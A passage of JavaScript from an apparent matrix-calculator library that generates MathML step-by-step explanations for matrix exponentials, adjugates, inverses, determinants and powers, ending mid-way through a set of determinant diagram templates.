      html += '<h4>' + i18n.exponential.findTheExponentialOfTheNilpotentMatrixN.replace(/\$\{N\}/g, '<math><mi>N</mi></math>') + '</h4>';
      html += '<div>'; // \u22EF == &hellip;

      html += '<math>' + Expression.p('e**N=I+N+1/2*N**2+1/6*N**3+a+1/f*N**k').replace(/<mi>a<\/mi>/g, '<mi>&hellip;</mi>').replace(/<mi>f<\/mi>/g, '<mrow><mi>k</mi><mo>!</mo></mrow>') + '</math>' + ' ' + i18n.exponentialOfNilpotentMatrixLink + i18n.colonSpacing + ':';
      html += '</div>'; //TODO: steps

      html += '<div>';
      var M = N;
      var k = 1;

      while (!M.eql(Matrix.Zero(M.rows(), M.cols()))) {
        M = M.multiply(M);
        k += 1;

        if (k > 2) {
          html += '; '; //?
        }

        html += '<math>' + Expression.p('N**' + k + '=M', {
          A: new Expression.Matrix(N),
          M: new Expression.Matrix(M)
        }, printOptions) + '</math>';
      }

      html += '</div>';
      html += '<div>';
      html += '<math>' + Expression.p('e**N=M', {
        M: expN
      }, printOptions) + '</math>';
      html += '</div>';
      return html;
    };

    if (matrix.isDiagonal()) {
      var expD = new Expression.Matrix(matrix).exp();
      var html = '';
      html += diagonalCase('D', expD);
      return html;
    } //TODO: The characteristic polynomial for N is det(xI-N)=x^{n}


    if (matrix.isNilpotent()) {
      var expN = new Expression.Matrix(matrix).exp();
      var html = '';
      html += '<h3>' + i18n.exponential.theMatrixIsNilpotent + '</h3>';
      html += nilpotentCase(matrix, expN);
      return html;
    }

    var A = matrix;
    var eigenvalues = Expression.getEigenvalues(A);
    var tmp = Expression.getFormaDeJordan(A, eigenvalues);
    var D = tmp.J.map(function (e, i, j) {
      return i === j ? e : Expression.ZERO;
    });
    var N = tmp.J.map(function (e, i, j) {
      return i !== j ? e : Expression.ZERO;
    });
    var expN = new Expression.Matrix(N).exp().matrix; //TODO: ?

    var expJmN = D.map(function (e, i, j) {
      return i === j ? e.exp() : Expression.ZERO;
    });
    var expA = tmp.P.multiply(expJmN).multiply(expN).multiply(tmp.P_INVERSED);
    var data = {
      A: A,
      P: tmp.P,
      J: tmp.J,
      P_INVERSED: tmp.P_INVERSED,
      N: N,
      JmN: D,
      expN: expN,
      expJmN: expJmN,
      expA: expA
    };

    for (var i in data) {
      if (Object.prototype.hasOwnProperty.call(data, i)) {
        data[i] = new Expression.Matrix(data[i]);
      }
    }

    var html = '';
    html += '<h3>' + i18n.exponential.exponentialUsingJordanCanonicalForm + '</h3>';
    html += '<math>' + Expression.p('exp(A)=exp(P*J*P^-1)=P*exp(J-N)*exp(N)*P^-1') + '</math>'; // data.P
    // data.J
    // data.P_INVERSED
    // data.N
    // data.JmN
    // data.expN
    // data.expJmN
    // data.expA
    // 1. Find a matrix in Jordan normal form:
    //   ...
    //   A = P*J*P**(-1) = X*Y*Z
    // 2. Then:
    //   N = M, J-N = M
    // 3. Find the exponential of the Nilpotent matrix (N):
    //   e**N=I+N+1/2*N**2+1/6*N**3+...+1(q-1)!*N**(q-1) (*)[https://en.wikipedia.org/wiki/Matrix_exponential#Nilpotent_case]:
    // ...
    // 4. Find the exponential of the diagonal matrix (J-N):
    //   Exponential can be obtained by exponentiating each entry on the main diagonal (*)[https://en.wikipedia.org/wiki/Matrix_exponential#Diagonalizable_case]:
    //   exp(J-N)=M
    // 5. Then:
    //   exp(A)=X*Y=Z

    html += '<ol>';
    html += '<li>';
    html += '<h3>' + i18n.exponential.findAMatrixInJordanNormalForm + '</h3>';
    html += createDetailsSummary(printOptions.idPrefix, [{
      type: "Jordan-decomposition",
      matrix: matrix.toString(),
      second: undefined
    }]);
    html += '<div>';
    html += '<math>' + Expression.p('A=P*J*P**(-1)') + '</math>' + ':';
    html += '</div>';
    html += '<div>';
    html += '<math>' + Expression.p('A=P*J*V', {
      A: data.A,
      P: data.P,
      J: data.J,
      V: data.P_INVERSED
    }, printOptions) + '</math>';
    html += '</div>';
    html += '</li>';
    html += '<li>';
    html += '<h4>' + i18n.exponential.then + '</h4>';
    html += '<div>';
    html += '<math>' + Expression.p('N=M', {
      M: data.N
    }, printOptions) + '</math>';
    html += ', ';
    html += '<math>' + Expression.p('J-N=M', {
      M: data.JmN
    }, printOptions) + '</math>';
    html += '</div>';
    html += '</li>';
    html += '<li>'; //TODO: when matrix is diagonalizable (?)

    html += nilpotentCase(data.N.matrix, data.expN);
    html += '</li>';
    html += '<li>';
    html += diagonalCase('(J-N)', data.expJmN);
    html += '</li>';
    html += '<li>';
    html += '<h4>' + i18n.exponential.then + '</h4>';
    html += '<div>';
    html += '<math>' + Expression.p('exp(A)=P*X*Y*V=M', {
      A: data.A,
      P: data.P,
      X: data.expJmN,
      Y: data.expN,
      V: data.P_INVERSED,
      M: data.expA
    }, printOptions) + '</math>';
    html += '</div>';
    html += '</li>';
    html += '</ol>'; //TODO:...

    return html;
  }
});
Expression.Details.add({
  type: "logarithm-using-diagonalization",
  minRows: 2,
  i18n: function () {
    return i18n.misc.calculatingTheLogarithmOfADiagonalizableMatrix;
  },
  callback: function (printOptions, matrix) {
    //TODO: ?
    return i18n.calculatingTheLogarithmOfADiagonalizableMatrixLink;
  }
});
Expression.Details.add({
  type: "logarithm-using-Jordan-canonical-form",
  minRows: 2,
  i18n: function () {
    return i18n.theLogarithmOfANonDiagonalizableMatrix;
  },
  callback: function (printOptions, matrix) {
    //TODO: ?
    return i18n.theLogarithmOfANonDiagonalizableMatrixLink;
  }
});

var getAdjugateByDefinition = function (printOptions, matrix) {
  var result = "";
  var cofactors = new Array(matrix.rows());

  for (var i = 0; i < matrix.rows(); i += 1) {
    cofactors[i] = new Array(matrix.cols());

    for (var j = 0; j < matrix.cols(); j += 1) {
      result += "<div>"; // TODO: <ul> - ?

      result += "<math>";
      result += Expression.p('C_(' + (i + 1) + ',' + (j + 1) + ')');
      result += '<mo>=</mo>';
      result += '<mrow>';
      result += Expression.p("(-1)^(i+j)", {
        i: Expression.Integer.fromNumber(i + 1),
        j: Expression.Integer.fromNumber(j + 1)
      }, printOptions);
      result += "<mo>&sdot;</mo>";
      result += new Expression.Minor(new Expression.Matrix(matrix), i, j).toMathML(printOptions);
      result += '</mrow>';
      var minorMatrix = matrix.minorMatrix(i, j);
      var minor = minorMatrix.determinant();
      var isOdd = i + j - 2 * Math.floor((i + j) / 2);
      var n = isOdd === 1 ? Expression.ONE.negate() : Expression.ONE;
      var c = n.multiply(minor);

      if (minorMatrix.rows() === 2) {
        //!
        result += "<munder accentunder=\"true\"><mo>=</mo><mtext>" + i18n.determinant2x2Link + "</mtext></munder>";
        result += Expression.p("n*(a*d-b*c)", {
          n: n,
          a: minorMatrix.e(0, 0),
          b: minorMatrix.e(0, 1),
          c: minorMatrix.e(1, 0),
          d: minorMatrix.e(1, 1)
        }, printOptions);
      }

      if (isOdd === 1) {
        result += "<mo>=</mo>";
        result += Expression.p("n*(d)", {
          n: n,
          d: minor
        }, printOptions);
      }

      result += "<mo>=</mo>";
      result += Expression.p("c", {
        c: c
      }, printOptions);
      result += "</math>";

      if (minorMatrix.rows() !== 2) {
        //!
        result += createDetailsSummary(printOptions.idPrefix, [{
          type: minorMatrix.getDeterminantEventType("determinant").type,
          matrix: minorMatrix.toString(),
          second: undefined
        }]);
      }

      cofactors[i][j] = c;
      result += "</div>";
    }
  }

  var CT = new Expression.Matrix(new Matrix(cofactors).transpose());
  return {
    result: result,
    CT: CT
  };
};

Expression.Details.add({
  type: "adjugate-by-definition",
  i18n: undefined,
  minRows: 2,
  //?
  priority: -1,
  callback: function (printOptions, matrix) {
    var tmp = getAdjugateByDefinition(printOptions, matrix);
    var result = tmp.result;
    var CT = tmp.CT;
    result += "<div>";
    result += "<math>";
    result += Expression.p("adjugate(A)=C^T=Y", {
      A: new Expression.Matrix(matrix),
      Y: CT
    }, printOptions);
    result += "</math>";
    result += " ";
    result += i18n.adjugateMatrixLink; //TODO:

    result += "</div>";
    return result;
  }
});
Expression.Details.add({
  type: "inverse-adjugate",
  i18n: function () {
    return i18n.inverse.inverseDetailsUsingAdjugateMatrix;
  },
  minRows: 3,
  priority: -1,
  callback: function (printOptions, matrix) {
    var result = "";
    result += "<div>";
    result += "<math>";
    result += Expression.p("A^-1=1/determinant(A)*C^T=1/determinant(A)*X", {
      X: new Expression.Matrix(matrix.map(function (e, i, j) {
        return new Expression.Symbol('C_(' + (j + 1) + ',' + (i + 1) + ')');
      }))
    }, printOptions);
    result += "</math>";
    result += " ";
    result += i18n.inverseDetailsUsingAdjugateMatrixLink; //TODO

    result += "</div>"; // https://upload.wikimedia.org/math/e/f/0/ef0d68882204598592f50ba054e9951e.png

    var determinant = matrix.determinant();
    result += "<div>";
    result += "<math>";
    result += Expression.p("determinant(A)=X=y", {
      X: new Expression.Determinant(new Expression.Matrix(matrix)),
      y: determinant
    }, printOptions);
    result += "</math>";
    result += createDetailsSummary(printOptions.idPrefix, [{
      type: matrix.getDeterminantEventType("determinant").type,
      matrix: matrix.toString(),
      second: undefined
    }]);
    result += "</div>";

    if (determinant.equals(Expression.ZERO)) {//TODO: ?
    } else {
      //!
      var tmp = getAdjugateByDefinition(printOptions, matrix);
      result += tmp.result;
      var CT = tmp.CT; // TODO: linkes
      // http://en.wikipedia.org/wiki/Cramer%27s_rule#Finding_inverse_matrix

      result += "<div>";
      result += "<math>";
      result += Expression.p("A^-1=1/determinant(A)*C^T=1/x*Y=Z", {
        x: determinant,
        Y: CT,
        Z: determinant.inverse().multiply(CT)
      }, printOptions);
      result += "</math>";
      result += "</div>";
    }

    return result;
  }
}); // new Intl.NumberFormat("it-u-nu-roman").format(n);

var roman = function (n) {
  var digits = "IVXLCDM";
  var i = digits.length + 1;
  var result = "";
  var value = 1000;

  while ((i -= 2) >= 0) {
    var v = Math.floor(value / 10);
    var j = -1;

    while (++j < 2) {
      while (n >= value) {
        n -= value;
        result += digits.slice(i - j, i - j + 1);
      }

      value -= v;

      while (n >= value) {
        n -= value;
        result += digits.slice(i - 2, i - 2 + 1) + digits.slice(i - j, i - j + 1);
      }

      value -= 4 * v;
    }

    value = v;
  }

  return result;
}; // use default locale (as it may be better for the end user and numbering system can depend on the region)
// TODO: localeString() outside of MathML, Expression.p() in mscript.js for <mn>_number_</mn>


var initNumberFormat = function (event) {
  Expression.numberFormat = new Intl.NumberFormat(undefined, {
    useGrouping: false
  });
};

globalThis.addEventListener('languagechange', initNumberFormat);
initNumberFormat();
var numberFormat = null;
globalThis.addEventListener('languagechange', function (event) {
  numberFormat = null;
});

var localeString = function (number) {
  console.assert(Math.floor(number) === number && number >= 0 && number <= Number.MAX_SAFE_INTEGER);

  if (numberFormat == null) {
    numberFormat = new Intl.NumberFormat(undefined, {
      useGrouping: false
    });
  }

  return numberFormat.format(number);
}; //TODO: remove


var getMatrixRowDenotation = function (i) {
  return i18n.matrixRowDenotation.replace(/\$\{i\}/g, localeString(i)).replace(/\$\{i\:roman\}/g, roman(i));
};

Matrix.prototype.getDeterminantEventType = function (base) {
  for (var i = 0; i < this.rows(); i += 1) {
    var isZero = true;

    for (var j = 0; j < this.cols(); j += 1) {
      var e = this.e(i, j);

      if (!e.equals(Expression.ZERO)) {
        isZero = false;
      }
    }

    if (isZero) {
      return {
        type: "special-determinant",
        row: i,
        col: -1
      };
    }
  }

  for (var j = 0; j < this.cols(); j += 1) {
    var isZero = true;

    for (var i = 0; i < this.rows(); i += 1) {
      var e = this.e(i, j);

      if (!e.equals(Expression.ZERO)) {
        isZero = false;
      }
    }

    if (isZero) {
      return {
        type: "special-determinant",
        row: -1,
        col: j
      };
    }
  }

  return {
    type: base,
    row: -1,
    col: -1
  };
}; //!new


Expression.Details.add({
  type: "special-determinant",
  i18n: undefined,
  priority: 1 / 0,
  minRows: 1,
  //TODO: add a test
  callback: function (printOptions, matrix) {
    var html = "";
    var x = matrix.getDeterminantEventType();
    html += "<div>";
    html += "<math>";
    html += new Expression.Determinant(new Expression.Matrix(matrix)).toMathML(Object.assign({}, printOptions, {
      highlightRow: x.row !== -1 ? x.row : undefined,
      highlightCol: x.col !== -1 ? x.col : undefined
    }));
    html += "<mo>=</mo>";
    html += Expression.p(0);
    html += "</math>";

    if (x.row !== -1 || x.col !== -1) {
      html += "<div>" + i18n.determinant.zeroRowColumn + "</div>";
    }

    html += "</div>";
    return html;
  }
});
Expression.Details.add({
  type: "add",
  i18n: function () {
    return i18n.add.matrixAddition;
  },
  minRows: 2,
  callback: function (printOptions, matrixA, matrixB) {
    return "<p>" + i18n.add.matrixAdditionInfo + "</p>" + getMatrixOperationDetails(printOptions, matrixA, matrixB, function (a, b) {
      return a.add(b);
    }, "+");
  }
});
Expression.Details.add({
  type: "multiply",
  i18n: function () {
    return i18n.multiply.matrixMultiplication;
  },
  minRows: 2,
  callback: function (printOptions, matrixA, matrixB) {
    return "<p>" + i18n.multiply.matrixMultiplicationInfo + "</p>" + getMatrixOperationDetails(printOptions, matrixA, matrixB, function (a, b) {
      return a.multiply(b);
    }, "&sdot;");
  }
});
Expression.Details.add({
  type: "trigonometric-function-of-inverse-trigonometric-function-arg",
  minRows: 1,
  maxRows: 1,
  callback: function (printOptions) {
    //TODO:
    var a = "https://www.rapidtables.com/math/trigonometry/arctan.html#rules";
    var b = "https://en.wikipedia.org/wiki/Inverse_trigonometric_functions#Relationships_between_trigonometric_functions_and_inverse_trigonometric_functions";
    return "see " + a.link(a) + ' and ' + b.link(b);
  }
});

function getMatrixOperationDetails(printOptions, matrixA, matrixB, operationFunction, operator) {
  var html = ""; //TODO: Should matrixA and matrixB already have NonSimplifiedExpressions-elements ???

  var matrixAn = matrixA.map(function (e, i, j) {
    return new NonSimplifiedExpression(e);
  });
  var matrixBn = matrixB.map(function (e, i, j) {
    return new NonSimplifiedExpression(e);
  });
  var matrixAB = operationFunction(matrixAn, matrixBn);
  var result = matrixAB.map(function (e, i, j) {
    return e.simplify();
  });
  html += "<math>";
  html += "<mrow>";
  html += new Expression.Matrix(matrixAn).toMathML(Object.assign({}, printOptions, {
    cellIdGenerator: function (i, j) {
      return matrixAn.e(i, j).getId();
    }
  }));
  html += "<mo>" + operator + "</mo>";
  html += new Expression.Matrix(matrixBn).toMathML(Object.assign({}, printOptions, {
    cellIdGenerator: function (i, j) {
      return matrixBn.e(i, j).getId();
    }
  }));
  html += "</mrow>";
  html += "<mo>=</mo>";
  html += new Expression.Matrix(matrixAB).toMathML(Object.assign({}, printOptions, {
    cellIdGenerator: function (i, j) {
      return matrixAB.e(i, j).getId();
    }
  }));
  html += "<mo>=</mo>";
  html += new Expression.Matrix(result).toMathML(printOptions);
  html += "</math>"; //TODO: highlight of "same" expression elements, when mouseover an element of matrixAB or matrixA or matrixB

  matrixAB.map(function (e, i, j) {
    html += "<a class=\"a-highlight\" data-for=\"" + e.getId().toString() + "\" data-highlight=\"" + e.unwrap().getIds() + "\"></a>";
    return e;
  });
  return html;
}

Expression.Details.add({
  type: "pow",
  i18n: function () {
    return i18n.multiply.matrixMultiplication;
  },
  minRows: 1,
  callback: function (printOptions, matrix, second) {
    var n = Number(second.e(0, 0).toString()); // n >= 1 (?)

    var i = 0;
    var c = 1;
    var t = [];
    t.push(matrix);
    var html = "<ul>";
    html += "<li>";
    html += "<math>";
    html += Expression.p("A") + "<mo>=</mo>" + new Expression.Matrix(t[i]).toMathML(printOptions);
    html += "</math>";
    html += "</li>";

    while (c * 2 <= n) {
      c *= 2;
      t.push(t[i].multiply(t[i]));
      html += "<li>";
      html += "<math>";
      html += Expression.p("A^" + c) + "<mo>=</mo>" + Expression.p("A^" + Math.floor(c / 2) + "*" + "A^" + Math.floor(c / 2)) + "<mo>=</mo>" + new Expression.Matrix(t[i + 1]).toMathML(printOptions);
      html += "</math>";
      html += "</li>";
      i += 1;
    }

    html += "</ul>";
    var result = undefined;
    var r = undefined;
    var nn = n;

    while (i !== -1 && nn !== 0) {
      if (nn >= c) {
        nn -= c;
        result = result == undefined ? t[i] : result.multiply(t[i]);
        var z = new Expression.NonSimplifiedExpression(new Expression.Symbol("A").pow(Expression.Integer.fromNumber(c)));
        r = r == undefined ? z : r.multiply(z);
      }

      c = Math.floor(c / 2);
      i -= 1;
    }

    html += "<math>";
    html += Expression.p("A^" + n) + "<mo>=</mo>" + r.toMathML(printOptions) + "<mo>=</mo>" + new Expression.Matrix(result).toMathML(printOptions);
    html += "</math>";
    return html;
  }
});
Expression.someDetailsNew = {
  "determinant2x2": "<span data-custom-paint=\"custom-menclose\" data-color=\"0a\" data-cells=\"[[0,0],[1,1]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"1a\" data-cells=\"[[0,1],[1,0]]\"><math><mrow><mo>|</mo><mtable rowspacing=\"0ex\"><mtr><mtd><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></mtd></mtr><mtr><mtd><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></mtd></mtr></mtable><mo>|</mo></mrow><mo>=</mo><mrow><mrow mathcolor=\"#D64040\"><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>1</mn></mrow></msub><mo>&sdot;</mo><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></mrow><mo>&minus;</mo><mrow mathcolor=\"#4040D6\"><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>2</mn></mrow></msub><mo>&sdot;</mo><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mrow></mrow></math></span></span>${link}",
  "determinant3x3": "<math><mrow><mo>|</mo><mtable rowspacing=\"0ex\"><mtr><mtd><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>3</mn></mrow></msub></mtd></mtr><mtr><mtd><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>3</mn></mrow></msub></mtd></mtr><mtr><mtd><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>3</mn></mrow></msub></mtd></mtr></mtable><mo>|</mo></mrow></math><math><mo>=</mo></math>",
  "matrix3x3": "<math><mtable rowspacing=\"0ex\"><mtr><mtd><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>3</mn></mrow></msub></mtd></mtr><mtr><mtd><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>3</mn></mrow></msub></mtd></mtr><mtr><mtd><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>3</mn></mrow></msub></mtd></mtr></mtable></math>",
  "determinantTriangle": "${determinant3x3}<table class=\"some-details-table\"><tr><td><math><mrow><mo>+</mo><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mrow><mo>&sdot;</mo><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>2</mn></mrow></msub><mo>&sdot;</mo><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>3</mn></mrow></msub></math></td><td><span data-custom-paint=\"custom-menclose\" data-color=\"0a\" data-cells=\"[[0,0],[1,1],[2,2]]\">${matrix3x3}</span></td></tr><tr><td><math><mrow><mo>+</mo><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></mrow><mo>&sdot;</mo><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>3</mn></mrow></msub><mo>&sdot;</mo><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></math></td><td><span data-custom-paint=\"custom-menclose\" data-color=\"0\" data-cells=\"[[0,0],[1,1],[2,2]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"0a\" data-cells=\"[[0,1],[1,2],[2,0]]\">${matrix3x3}</span></span></td></tr><tr><td><math><mrow><mo>+</mo><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>3</mn></mrow></msub></mrow><mo>&sdot;</mo><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>1</mn></mrow></msub><mo>&sdot;</mo><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></math></td><td><span data-custom-paint=\"custom-menclose\" data-color=\"0\" data-cells=\"[[0,0],[1,1],[2,2]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"0\" data-cells=\"[[0,1],[1,2],[2,0]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"0a\" data-cells=\"[[0,2],[1,0],[2,1]]\">${matrix3x3}</span></span></span></td></tr><tr><td><math><mrow><mo>&minus;</mo><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>3</mn></mrow></msub></mrow><mo>&sdot;</mo><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>2</mn></mrow></msub><mo>&sdot;</mo><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></math></td><td><span data-custom-paint=\"custom-menclose\" data-color=\"0\" data-cells=\"[[0,0],[1,1],[2,2]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"0\" data-cells=\"[[0,1],[1,2],[2,0]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"0\" data-cells=\"[[0,2],[1,0],[2,1]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"1a\" data-cells=\"[[2,0],[1,1],[0,2]]\">${matrix3x3}</span></span></span></span></td></tr><tr><td><math><mrow><mo>&minus;</mo><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mrow><mo>&sdot;</mo><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>3</mn></mrow></msub><mo>&sdot;</mo><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></math></td><td><span data-custom-paint=\"custom-menclose\" data-color=\"0\" data-cells=\"[[0,0],[1,1],[2,2]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"0\" data-cells=\"[[0,1],[1,2],[2,0]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"0\" data-cells=\"[[0,2],[1,0],[2,1]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"1\" data-cells=\"[[2,0],[1,1],[0,2]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"1a\" data-cells=\"[[2,1],[1,2],[0,0]]\">${matrix3x3}</span></span></span></span></span></td></tr><tr><td><math><mrow><mo>&minus;</mo><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></mrow><mo>&sdot;</mo><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>1</mn></mrow></msub><mo>&sdot;</mo><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>3</mn></mrow></msub></math>${link}</td><td><span data-custom-paint=\"custom-menclose\" data-color=\"0\" data-cells=\"[[0,0],[1,1],[2,2]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"0\" data-cells=\"[[0,1],[1,2],[2,0]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"0\" data-cells=\"[[0,2],[1,0],[2,1]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"1\" data-cells=\"[[2,0],[1,1],[0,2]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"1\" data-cells=\"[[2,1],[1,2],[0,0]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"1a\" data-cells=\"[[2,2],[1,0],[0,1]]\">${matrix3x3}</span></span></span></span></span></span></td></tr></table>",
  "matrix5x3": "<math><mtable rowspacing=\"0ex\" columnlines=\"none none dashed none\"><mtr><mtd><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>3</mn></mrow></msub></mtd><mtd mathcolor=\"#808080\"><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mtd><mtd mathcolor=\"#808080\"><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></mtd></mtr><mtr><mtd><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>3</mn></mrow></msub></mtd><mtd mathcolor=\"#808080\"><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mtd><mtd mathcolor=\"#808080\"><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></mtd></mtr><mtr><mtd><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>3</mn></mrow></msub></mtd><mtd mathcolor=\"#808080\"><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mtd><mtd mathcolor=\"#808080\"><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></mtd></mtr></mtable></math>",
  "determinantSarrus": "${determinant3x3}<table class=\"some-details-table\"><tr><td><math><mrow><mrow><mo>+</mo><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mrow><mo>&sdot;</mo><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>2</mn></mrow></msub><mo>&sdot;</mo><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>3</mn></mrow></msub></mrow><mo>+</mo><mrow><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>2</mn></mrow></msub><mo>&sdot;</mo><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>3</mn></mrow></msub><mo>&sdot;</mo><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mrow><mo>+</mo><mrow><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>3</mn></mrow></msub><mo>&sdot;</mo><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>1</mn></mrow></msub><mo>&sdot;</mo><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></mrow></math></td><td><span data-custom-paint=\"custom-menclose\" data-color=\"0a\" data-cells=\"[[0,0],[1,1],[2,2]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"0a\" data-cells=\"[[0,1],[1,2],[2,3]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"0a\" 